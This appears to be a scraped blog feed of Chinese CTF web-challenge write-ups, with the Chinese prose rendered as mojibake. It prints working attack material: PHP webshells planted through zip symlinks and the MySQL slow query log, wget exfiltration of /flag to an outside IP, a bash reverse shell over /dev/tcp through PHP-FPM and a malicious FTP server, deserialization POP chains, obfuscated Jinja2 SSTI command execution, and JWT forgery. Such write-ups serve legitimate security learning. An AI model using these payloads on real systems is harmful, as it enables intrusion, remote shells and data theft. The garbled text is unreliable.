\u0026#39;username\u0026#39;: username+payload, \u0026#39;password\u0026#39;: \u0026#39;AAAAAA\u0026#39; } print \u0026#39;ok\u0026#39; r = requests.post(\u0026#39;http://10.188.2.20:12345/reg\u0026#39;, data=data); print r.content æ·±è‚²è¿™ä¸ªé¢˜ä¸è¿‡æ˜¯æŠŠç™½ç›’å®¡è®¡æ¢æˆäº†é»‘ç›’ï¼Œæ€è·¯ä¸€æ¨¡ä¸€æ ·ï¼Œå°±ä¸ç»†å—¦äº†\nå‚è€ƒwpï¼šhitconDockerfile/hitcon-ctf-2017/sql-so-hard/ï¼ˆæœ‰è¿™ä½å¸ˆå‚…è‡ªåˆ¶çš„dockerå¯ä»¥è‡ªè¡Œå¤ç°ï¼‰\nZipZip é¡µé¢æºç æç¤ºï¼šå¬è¯´å‹ç¼©åŒ…æ–‡ä»¶ä¹Ÿèƒ½getshellï¼›å‹ç¼©åŒ…çš„ä¸€ä¸ªå¸¸è€ƒç‚¹æ˜¯è½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡è„‘å­å¤ªæœ¨äº†æ²¡æƒ³åˆ°å¦‚ä½•å†™shellè¿›å»ï¼Œçœ‹äº†wpä»¥åæ‰æ˜ç™½\nä¸Šä¼ zipä¹‹åå›æ˜¾çš„è·¯å¾„æ˜¯/tmp/uploadsï¼Œæ˜¾ç„¶æ— æ³•æ­£å¸¸è®¿é—®ï¼›è¿™é‡Œå¯ä»¥åˆ©ç”¨è½¯é“¾æ¥å°†shellå†™å…¥/var/www/html\né¦–å…ˆåˆ›å»ºä¸€ä¸ªæŒ‡å‘/var/www/html/ç›®å½•çš„è½¯é“¾æ¥å¹¶zipå‹ç¼©ä¸Šä¼ \nln -s /var/www/html/ l1 zip -ry l1.zip l1 ç„¶åå»ºç«‹ä¸€ä¸ªå’Œè½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œåœ¨é‡Œé¢å†™shellï¼Œä¹‹åå°†è¿™ä¸ªåŒåçš„ç›®å½•æ•´ä¸ªzipå‹ç¼©ä¸Šä¼ \n# å½“å‰ç›®å½•/var/www/html/ mkdir l1 \u0026amp;\u0026amp; cd l1 echo \u0026#39;\u0026lt;?php eval($_GET[\u0026#39;wuhu\u0026#39;]);?\u0026gt;\u0026#39; \u0026gt; shell.php cd ../\t# ç»§ç»­è½¬åˆ°/var/www/html/ zip -r l2.zip ./* å³å¯å†™å…¥shell\n***WebLog ä¸€æ‰“å¼€å°±ä¼šä¸‹è½½ä¸€ä¸ªlogæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆå†…å®¹ï¼Œä¿®æ”¹getå‚æ•°ä¸º/?logname=logs/info/info.2021-11-12.logå¯ä»¥å¾—åˆ°çœŸæ­£çš„logï¼Œå¯ä»¥çœ‹åˆ°æ˜¯javaï¼Œæˆ‘çˆ¬äº†\neasysql long_query_time\nå¸¸ç”¨çš„selectã€å•åŒå¼•å·ã€æ‹¬å·ã€åˆ†å·ã€setã€showã€variablesã€ç­‰éƒ½æ²¡æœ‰è¿‡æ»¤ï¼Œè¯­å¥é—­åˆæ–¹å¼ä¸ºæ‹¬å·ï¼Œç™¾åå•ä¸ºæ•°æ®åº“è®°å½•è¡Œæ•°ï¼Œä½¿ç”¨1);{sqlinject}--+å¯ä»¥é—­åˆæŸ¥è¯¢è¯­å¥+å †å æ³¨å…¥\nshow variables like \u0026#39;%slow_query_log%\u0026#39;;\t# æŸ¥è¯¢æ…¢æ—¥å¿—è®°å½•æ˜¯å¦å¼€å¯ setglobal slow_query_log=1;\t# å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿— setglobal slow_query_log_file=\u0026#39;/var/www/html/helpyou2findflag.php\u0026#39;\t# è®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—ä½ç½® æ…¢æŸ¥è¯¢ï¼Œé¡¾åæ€ä¹‰æ—¶é—´é•¿çš„æŸ¥è¯¢è®°å½•ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠlong_query_timeçš„é»˜è®¤å€¼æ”¹æ‰ï¼Œç„¶åå†™å…¥shell\n1);setglobal long_query_time=0.000001;--+ 1);show variables like \u0026#39;long_query_time\u0026#39;l--+ 1);select \u0026#39;\u0026lt;?php $_REQUEST[a]($_REQUEST[b])?\u0026gt;\u0026#39;;--+ æˆ–è€…ç”¨benchmarkè¿™æ ·çš„å‡½æ•°å»¶é•¿æ‰§è¡Œæ—¶é—´\n1);set GLOBAL slow_query_log_file=\u0026#39;/var/www/html/helpyou2findflag.php\u0026#39;;set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e from mysql.db where BENCHMARK(5000000000,MD5(0x5476556d));%23 flagä½äº/home/rainbow/ssh.log\næ¯”èµ›èƒ½æš´éœ²å‡ºæˆ‘å¤ªå¤šçŸ­æ¿äº†ï¼Œé—®é¢˜æŒºå¤§çš„\né¦–å…ˆæ˜¯å®¹æ˜“æ‰‹å¿™è„šä¹±ï¼Œç¬¬äºŒæ˜¯ä»–å¦ˆçš„è·Ÿä¸ªè„‘ç˜«ä¸€æ ·æ‰¾åˆ°åŸé¢˜éƒ½ä¸ä¼šå˜é€šï¼Œç¬¬ä¸‰æ˜¯å°±ä¼šçbbä¸ä¼šå­¦javaï¼Œç¬¬å››æ˜¯ç¼ºä¹è·Ÿé˜Ÿå‹çš„æ²Ÿé€š\nå°±å·®ä¸€é¢˜å°±è¿›çº¿ä¸‹äº†ï¼Œè¿™ä¸€é¢˜å°±æŠ˜åœ¨æˆ‘è¿™é‡Œï¼ŒçœŸæ˜¯æˆ‘å…¨è´£ï¼ŒçœŸçš„å¾ˆå¯¹ä¸èµ·å¦å¤–çš„pwnçˆ·å’Œå¯†ç çˆ·ï¼Œå¤ªä¸¢äººäº†ï¼Œæˆ‘å…ˆç£•ä¸€ä¸ªï¼Œç„¶åç»™è‡ªå·±ä¸¤æ‹³\nå¤ªä»–å¦ˆå¯æƒœäº†ï¼Œè‰\n","date":"2021-11-17T19:11:38+08:00","permalink":"https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/","section":"posts","tags":["wp"],"title":"æ·±è‚²æ¯2021 Wp"},{"categories":["CTF"],"contents":"CheckIN æ˜¯ä¸ªgoçš„æ–‡ä»¶ï¼Œå‘ç°äº†/wgetè·¯ç”±å¯ä»¥æ‰§è¡Œwgetå‘½ä»¤ï¼Œæ¥æ”¶çš„å‚æ•°å¯ä»¥æ˜¯ä¸ªæ•°ç»„\nåˆ©ç”¨wgetçš„å‚æ•°å¤–å¸¦flag\n/wget?argv=1\u0026amp;agrv=--post-file\u0026amp;argv=/flag\u0026amp;agrv=http://101.35.114.107:8426/ eaaasyphp \u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint { public function __wakeup(){ $this-\u0026gt;hint = \u0026#34;no hint\u0026#34;; } public function __destruct(){ if(!$this-\u0026gt;hint){ $this-\u0026gt;hint = \u0026#34;phpinfo\u0026#34;; ($this-\u0026gt;hint)(); } } } class Bunny { public function __toString() { if (Check::$str2) { if(!$this-\u0026gt;data){ $this-\u0026gt;data = $_REQUEST[\u0026#39;data\u0026#39;]; } file_put_contents($this-\u0026gt;filename, $this-\u0026gt;data); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } class Welcome { public function __invoke() { Check::$str2 = true; return \u0026#34;Welcome\u0026#34; . $this-\u0026gt;username; } } class Bypass { public function __destruct() { if (Check::$str1) { ($this-\u0026gt;str4)(); } else { throw new Error(\u0026#34;Error\u0026#34;); } } } if (isset($_GET[\u0026#39;code\u0026#39;])) { unserialize($_GET[\u0026#39;code\u0026#39;]); } else { highlight_file(__FILE__); } è¿™ä¸ªé¢˜ï¼Œæ€ä¹ˆè¯´ è¿˜æ˜¯æˆ‘å¤ªå¹´è½»äº† æˆ‘ä»¥ä¸ºè¿™ä¸ªå°±æ˜¯ç®€å•çš„ååºåˆ—åŒ–+shellå†™å…¥ï¼Œç„¶åéå¸¸çš„ç–‘æƒ‘ä¸ºå•¥æœ¬åœ°å¯ä»¥ä½†æ˜¯è¿œç¨‹çš„shellæ­»æ´»å°±æ˜¯ä¸è½åœ°ï¼Œä¸€ç›´åœ¨æƒ³æ€ä¹ˆç»•è¿‡ï¼Œè¿™æ˜¯å½“æ—¶å°è¯•çš„exp.php\n\u0026lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public $str3; } class Bunny { public $filename; public $data; } class Welcome { public $username; } class Bypass { public $str4; } $check = new Check(); $esle = new Esle(); $bypass = new Bypass(); $welcome = new Welcome(); $bunny = new Bunny(); $esle -\u0026gt; str3 = $bypass; // $bypass -\u0026gt; str4 = \u0026#39;phpinfo\u0026#39;; $bypass -\u0026gt; str4 = $welcome; $welcome -\u0026gt; username = $bunny; $bunny -\u0026gt; filename = \u0026#34;op.php\u0026#34;; $bunny -\u0026gt; data = \u0026#34;xyz\u0026#34; $payload = serialize($esle); echo $payload; ç›´åˆ°èµ›åæ‰çŸ¥é“è¿™åˆåˆåˆæ˜¯fpmï¼Œéœ€è¦ç”¨ftpæ‰“fpmï¼Œå…·ä½“çš„å†…å®¹æˆ‘æœ€è¿‘ä¹Ÿæ­£åœ¨æ€»ç»“ï¼Œå¯ä»¥å‚è§-\u0026gt;æ”»å‡» PHP-FPM å­¦ä¹ ç¬”è®°ï¼ˆè¿˜æ²¡å…¨éƒ¨æ”¶å°¾ï¼‰\né¦–å…ˆæ˜¯ä¾æ®pç‰›çš„è„šæœ¬ç”Ÿæˆä¸€ä¸ªurlencodeçš„payloadï¼ˆè¿™é‡Œå¼•å·æœ‰é—®é¢˜çš„è¯ç›´æ¥æ”¹è„šæœ¬å§ï¼‰\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; -c \u0026#39;\u0026lt;?php exec(\u0026#34;bash -c \\\u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.114.107/8426 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);?\u0026gt;\u0026#39; ç„¶åå¼€ä¸€ä¸ªæ¶æ„çš„ftp-server\nimport socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 8001)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 welcome\\n\u0026#39;) #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b\u0026#39;331 Please specify the password.\\n\u0026#39;) #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b\u0026#39;230 Login successful.\\n\u0026#39;) #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b\u0026#39;200 Switching to Binary mode.\\n\u0026#39;) #Size / conn.send(b\u0026#39;550 Could not get the file size.\\n\u0026#39;) #EPSV (1) conn.send(b\u0026#39;150 ok\\n\u0026#39;) #PASV conn.send(b\u0026#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n\u0026#39;) #STOR / (2) conn.send(b\u0026#39;150 Permission denied.\\n\u0026#39;) #QUIT conn.send(b\u0026#39;221 Goodbye.\\n\u0026#39;) conn.close() print(\u0026#34;endd\u0026#34;) ä¿®æ”¹ä¹‹å‰çš„ååºåˆ—åŒ–exp\n\u0026lt;?php class Bunny{ public function __construct(){ $this-\u0026gt;data = urldecode(\u0026#39;xxxxxxxxxxxxxxxxxx\u0026#39;); $this-\u0026gt;filename = \u0026#34;ftp://101.35.114.107:8001/aaa\u0026#34;; } } class Welcome{ public function __construct(){ $this-\u0026gt;username = new Bunny(); } } class Bypass{ public function __construct(){ $this-\u0026gt;str4 = new Welcome(); } } class Esle{ } echo urlencode(serialize(array(new Esle(), new Bypass()))); getæ–¹å¼ä¼ å…¥ï¼ŒåŒæ—¶vpsä¸Šå¼€ä¸€ä¸ªftp-serverå’Œä¸€ä¸ªç›‘å¬åå¼¹shellçš„ç«¯å£ï¼Œå³å¯æ‹¿flag\nMagicMail åŸé¢˜ï¼Œsstiå¥—å£³ï¼Œå‚è§-\u0026gt;[DeconstruCTF 2021]Mega Mailerï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡å‡ºï¼Œæ˜¯æˆ‘çš„é—®é¢˜ï¼Œå¹³æ—¶æ‹¿ç°æˆçš„payloadæ¢­æƒ¯äº†ï¼Œè‡ªå·±æ„é€ çš„æ—¶å€™å°±éœ²äº†æ€¯\npayloadçš„æ„é€ å‚è§-\u0026gt;Jinja2 SSTI filter bypassesï¼Œä½¿ç”¨attr()+hexå­—ç¬¦ä¸²çš„æ–¹å¼æŠŠåŸºç¡€payloadç»™æ‹¼å‡ºæ¥\nsender=\u0026amp;receiver=\u0026amp;subject=\u0026amp;message={{()|attr(\u0026#34;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f\u0026#34;)()|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(180)|attr(\u0026#34;\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f\u0026#34;)(\u0026#34;\\x65\\x76\\x61\\x6c\u0026#34;)(\u0026#34;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x27\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x27\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\u0026#34;)}} # åŸæœ¬çš„æ ·å­ ().__class__.__base__.subclasses()[180].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag\u0026#39;).read()\u0026#34;) ","date":"2021-11-16T14:24:03+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/","section":"posts","tags":["wp"],"title":"é™‡åŸæˆ˜ç–«CTF Wp"},{"categories":["CTF"],"contents":"ç»™æˆ‘çœ‹çœ‹ \u0026lt;?php header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); error_reporting(0); require_once(\u0026#34;flag.php\u0026#34;); class whoami{ public $name; public $your_answer; public $useless; public function __construct(){ $this-\u0026gt;name=\u0026#39;ctfshowç¬¬ä¸€æ·±æƒ…\u0026#39;; $this-\u0026gt;your_answer=\u0026#39;Only you know\u0026#39;; $this-\u0026gt;useless=\u0026#34;I_love_u\u0026#34;; } public function __wakeup(){ global $flag; global $you_never_know; $this-\u0026gt;name=$you_never_know; if($this-\u0026gt;your_answer === $this-\u0026gt;name){ echo $flag; } } } $secret = $_GET[\u0026#39;s\u0026#39;]; if(isset($secret)){ if($secret===\u0026#34;ç»™æˆ‘çœ‹çœ‹!\u0026#34;){ extract($_POST); if($secret===\u0026#34;ç»™æˆ‘çœ‹çœ‹!\u0026#34;){ die(\u0026#34;\u0026lt;script\u0026gt;window.alert(\u0026#39;è¿™æ˜¯ä¸èƒ½è¯´çš„ç§˜å¯†\u0026#39;);location.href=\u0026#39;https://www.bilibili.com/video/BV1CW411g7UF\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } unserialize($secret); } }else{ show_source(__FILE__); } æ˜¯å‡ ä¸ªå°trickçš„åˆé›†ï¼Œä¸éš¾\nextract()å¯ä»¥å˜é‡è¦†ç›– $this-\u0026gt;your_answer === $this-\u0026gt;nameè¿™æ ·çš„å¼ºæ¯”è¾ƒå¯ä»¥ç”¨æŒ‡é’ˆå–åœ°å€æ–¹å¼ç»•è¿‡ exp\n$test = new whoami(); $test-\u0026gt;your_answer=\u0026amp;$test-\u0026gt;name; echo serialize($test); payload\n/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21 POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D è°æ˜¯ctfä¹‹ç‹ï¼Ÿ æ®è¯´è¾“å…¥æ¡†èƒ½è¿èµ·æ¥çš„\nf12å¯ä»¥çœ‹åˆ°æç¤º/ssti.html\nç„¶åæ²¡å•¥å¯è¯´çš„ï¼ŒåŸé¢˜ï¼Œä¸€ç‚¹éƒ½æ²¡æ”¹ï¼Œç›´æ¥çœ‹ä¹‹å‰çš„åšå®¢-\u0026gt;[DigitalOverdoseCTF 2021]madlib\nyysyï¼Œçœ‹åˆ°è¿™ä¸ªhintæˆ‘å°±å·²ç»æ„è¯†åˆ°æ˜¯åœ¨è€ƒè¿™ä¸ªé¢˜äº†ï¼Œæœç„¶ï¼Œæ²¡æ‹¿ä¸Šä¸€è¡€å¯æƒœäº†\neasypop \u0026lt;?php highlight_file (__FILE__); error_reporting(0); class action_1{ public $tmp; public $fun = \u0026#39;system\u0026#39;; public function __call($wo,$jia){ call_user_func($this-\u0026gt;fun); } public function __wakeup(){ $this-\u0026gt;fun = \u0026#39;\u0026#39;; die(\u0026#34;é˜¿ç¥–æ”¶æ‰‹å§ï¼Œå¤–é¢æœ‰å¥—ç¥\u0026#34;); } public function __toString(){ return $this-\u0026gt;tmp-\u0026gt;str; } } class action_2{ public $p; public $tmp; public function getFlag(){ if (isset($_GET[\u0026#39;ctfshow\u0026#39;])) { $this-\u0026gt;tmp = $_GET[\u0026#39;ctfshow\u0026#39;]; } system(\u0026#34;cat /\u0026#34;.$this-\u0026gt;tmp); } public function __call($wo,$jia){ phpinfo(); } public function __wakeup(){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;phpç‰ˆæœ¬7.3å“¦ï¼Œæ²¡æœ‰äººå¯ä»¥å†ç»•è¿‡æˆ‘äº†\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } class action_3{ public $str; public $tmp; public $ran; public function __construct($rce){ echo \u0026#34;é€ç»™ä½ äº†\u0026#34;; system($rce); } public function __destruct(){ urlencode($this-\u0026gt;str); } public function __get($jia){ if(preg_match(\u0026#34;/action_2/\u0026#34;,get_class($this-\u0026gt;ran))){ return \u0026#34;å•¥ä¹Ÿæ²¡æœ‰\u0026#34;; } return $this-\u0026gt;ran-\u0026gt;$jia(); } } class action_4{ public $ctf; public $show; public $jia; public function __destruct(){ $jia = $this-\u0026gt;jia; echo $this-\u0026gt;ran-\u0026gt;$jia; } public function append($ctf,$show){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo new $ctf($show); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;ctf,$this-\u0026gt;show); } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ $pop = $_GET[\u0026#39;pop\u0026#39;]; $output = unserialize($pop); if(preg_match(\u0026#34;/php/\u0026#34;,$output)){ echo \u0026#34;å¥—ç¥é»‘è¿›è¿™é‡Œå¹¶ç»™ä½ äº†ä¸€ä¸ªæç¤ºï¼šæ–‡ä»¶åæ˜¯få¼€å¤´çš„å½¢å¦‚fA6_å½¢å¼çš„æ–‡ä»¶\u0026#34;; die(\u0026#34;ä¸å¯ä»¥ç”¨ä¼ªåè®®å“¦\u0026#34;); } } å…ˆç›´æ¥æ”¾payloadæŠŠï¼Œç›´æ¥ç”¨çš„action_3çš„rce\n\u0026lt;?php class action_4{ public function __construct(){ $this-\u0026gt;ctf = \u0026#39;action_3\u0026#39;; $this-\u0026gt;show = \u0026#39;cat /fz3_.txt\u0026#39;; } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } echo serialize(new action_3()); è¿™ä¸ªåº”è¯¥æ¯”è¾ƒç®€å•ï¼Œä¸ç”¨åˆ†æéƒ½èƒ½çœ‹æ˜ç™½\nå®˜æ–¹wpçš„é¢„æœŸè§£é•¿è¿™æ ·-\u0026gt;wpï¼Œé¦–å…ˆç”¨åˆ°äº†phpçš„å†…ç½®ç±»DirectoryIteratoré…åˆglobä¼ªåè®®çˆ†ç ´flagæ–‡ä»¶å\n\u0026lt;?php class action_4 { public function __construct(){ $this-\u0026gt;ctf = \u0026#34;DirectoryIterator\u0026#34;; //GlobIterator $this-\u0026gt;show =\u0026#34;glob:///f[A-z][0-9]_*\u0026#34;; } } class action_3{ public function __construct(){ $this-\u0026gt;str = new action_1(); } } class action_1{ public function __construct(){ $this-\u0026gt;tmp = new action_2(); } } class action_2{ public function __construct(){ $this-\u0026gt;p = new action_4(); } } echo serialize(new action_3()); è¿™ä¸ªç¡®å®ï¼Œä½†æ˜¯ä¹‹åçš„call_user_funcï¼Œæˆ‘åªèƒ½è¯´ æœ‰ä¸€è¯´ä¸€ æˆ‘æ˜¯æ²¡å¤ç°æˆåŠŸ\nè¿™é‡Œçš„æ­»äº¡wakeupæ°¸è¿œä¼šæ¯”callå…ˆè°ƒç”¨ï¼Œfuncè¿™é‡Œè¿˜æ²¡åˆ°call_user_funcå°±å…ˆè¢«æ¸…ç©ºäº†ï¼Œæ€ä¹ˆæ‰§è¡Œï¼Ÿï¼Ÿï¼Ÿ\nè¿‘åœ¨çœ¼å‰ #!/usr/bin/env python3 from flask import Flask, render_template_string, request from flask_limiter import Limiter from flask_limiter.util import get_remote_address app = Flask(__name__) limiter = Limiter( app, key_func=get_remote_address, default_limits=[\u0026#34;10000 per hour\u0026#34;] ) @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/\u0026#39;) def index(): return (\u0026#34;\\x3cpre\\x3e\\x3ccode\\x3e%s\\x3c/code\\x3e\\x3c/pre\\x3e\u0026#34;)%open(__file__).read() @limiter.limit(\u0026#34;5/second\u0026#34;, override_defaults=True) @app.route(\u0026#39;/ssti\u0026#39;) def check(): flag = open(\u0026#34;/app/flag.txt\u0026#34;, \u0026#39;r\u0026#39;).read().strip() if \u0026#34;input\u0026#34; in request.args: query = request.args[\u0026#34;input\u0026#34;] render_template_string(query) return \u0026#34;Thank you for your input.\u0026#34; return \u0026#34;No input found.\u0026#34; app.run(\u0026#39;0.0.0.0\u0026#39;, 80) å±äºæ˜¯char-by-charç±»å‹ç›²æ³¨å’Œsstiçš„ç»“åˆï¼Œé™åˆ¶äº†1ç§’5æ¬¡è¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ç‰¹æ„é™åˆ¶ä¸€ä¸‹\nimport requests _url = \u0026#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=\u0026#39; _payload_1 = \u0026#34;{%25 set flag=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /app/flag.txt\u0026#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;sleep 2.5\u0026#39;)%25}{%25if \u0026#39;\u0026#34; _payload_2 = \u0026#34;\u0026#39; in flag%25}{{sleep.read()}}{%25endif%25}\u0026#34; r = requests.session() charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-_{}\u0026#39; data = \u0026#39;\u0026#39; content = \u0026#39;ctfshow{\u0026#39; for _ in range(40): for i in charset: data = content + i # print(data) url = _url + _payload_1 + data + _payload_2 try: r.get(url=url, timeout=(2.5, 2.5)) except Exception as e: content = data print(content) break print(data) æœ‰å°æ¦‚ç‡ä¼šå´©ï¼Œå¯ä»¥å¤šè·‘ä¸€æ¬¡\né€šå…³å¤§ä½¬ ç™»å½•ï¼Œå°è¯•admin: adminï¼Œå›æ˜¾ ä½ ä¸èƒ½ä»¥ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼ŒæŠ“åŒ…çœ‹åˆ°jwtï¼Œå…ˆç”¨jwt.ioæ¢­ä¸€ä¸‹\nå†ç”¨c-jwt-crackeræ¢­ä¸€ä¸‹ï¼Œçˆ†å‡ºæ¥key=12345ï¼ˆä¸è¿‡è¯´å®è¯æˆ‘è¿™é‡ŒçœŸæ²¡çˆ†å‡ºæ¥ï¼‰ï¼Œå†ç”¨jwt.ioæ”¹ä¸€ä¸‹userå’Œexp\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio çœ‹åˆ°è¿™ç§çš„æ¡†ï¼Œç›´è§‰å°±æ˜¯sqli, xss, sstiï¼›åŠ ä¸Šjwtä¸€èˆ¬flaskä¼šç”¨ï¼Œè¯•ä¸€ä¸‹sstiï¼Œæœç„¶\nè¿™é‡Œçš„é€šå…³äººå¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæ’åéœ€è¦æ˜¯æ•°å­—ï¼Œæ—¶é—´æ²¡æœ‰å•¥å¿…è¦æ”¹ï¼Œæ„Ÿè¨€ä¸é™é•¿åº¦ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€ç¥¨å­—ç¬¦ï¼ˆå•åŒå¼•å·ï¼ˆæ— æ³•ç”¨hexå’Œæ‹¼æ¥ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼Œrequestï¼Œä¸­æ‹¬å·ï¼Œç™¾åˆ†å·ï¼ˆæ— æ³•forè¯­å¥éå† å¦‚æœç”¨chr()è¿˜å¾—çˆ†ç ´ï¼‰ï¼Œç®—æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„äº†ï¼‰ï¼Œå¯ä»¥ç”¨|attr()è¿™æ ·çš„å½¢å¼æ¥ç»•è¿‡ï¼Œçœ‹äº†wpä¹‹åå‘ç°è¿™é‡Œè¿˜ç»“åˆäº†request.argsï¼Œä¹Ÿå°±æ˜¯åŠ ä¸€äº›getå‚æ•°ç„¶ååœ¨postçš„éƒ¨åˆ†è¿›è¡Œå¼•ç”¨ï¼Œå†å……åˆ†åˆ©ç”¨configè¿™ä¸ªå¯¹è±¡ï¼ˆå‰é¢é‚£ä¸ªåŸé¢˜ä¹Ÿæ˜¯å……åˆ†ç”¨äº†configï¼‰ï¼Œpayload:\n/edit?a=__init__\u0026amp;b=__globals__\u0026amp;c=__getitem__\u0026amp;d=os\u0026amp;e=popen\u0026amp;f=whoami\u0026amp;g=read POST: name={%25set%20r=request.args%25}\u0026amp;rank=1\u0026amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}\u0026amp;time=2021å¹´11æœˆ11æ—¥ ","date":"2021-11-16T03:00:57+08:00","permalink":"https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/","section":"posts","tags":["wp"],"title":"CTFshow1121å‡»å‰‘æ¯ Wp"},{"categories":["CTF"],"contents":"å®‰å…¨æ”»é˜²\u0026ndash;1 https://security.bilibili.com/sec1024/q/r1.html | æç¤º\n1024ç¨‹åºå‘˜èŠ‚ï¼Œå¤§å®¶ä¸€èµ·å’Œ2233å‚ä¸è§£å¯†æ¸¸æˆå§~ happy_1024_2233: e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364 0408abca7deabb96a58f50471171b60e02b1a8dbd32db156\na1cd5f84-27966146-3776f301-64031bb9\nå®‰å…¨æ”»é˜²\u0026ndash;2 https://security.bilibili.com/sec1024/q/ | æç¤º\næŸé«˜çº§å‰ç«¯å¼€å‘æ”»åŸç‹®æ›´æ”¹äº†ä¸€ä¸ªå‰ç«¯é…ç½®é¡¹\næç¤ºä¸­ç»™çš„æ˜¯vueçš„å®˜æ–¹æ–‡æ¡£ï¼Œå¹¶ä¸”å®šä½åˆ°äº†productionSourceMap\næ¥ä¸€æ³¢f12\n36c7a7b4-cda04af0-8db0368d-b5166480\nå®‰å…¨æ”»é˜²\u0026ndash;3 https://security.bilibili.com/sec1024/q/eval.zip | æç¤º\nPHP is the best language for web programming, but what about other languages?\n\u0026lt;?php /* bilibili- ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯~ uat: http://192.168.3.2/uat/eval.php pro: http://security.bilibili.com/sec1024/q/pro/eval.php */ $args = @$_GET[\u0026#39;args\u0026#39;]; if (count($args) \u0026gt;3) { exit(); } for ( $i=0; $i\u0026lt;count($args); $i++ ){ if ( !preg_match(\u0026#39;/^\\w+$/\u0026#39;, $args[$i]) ) { exit(); } } // todo: other filter $cmd = 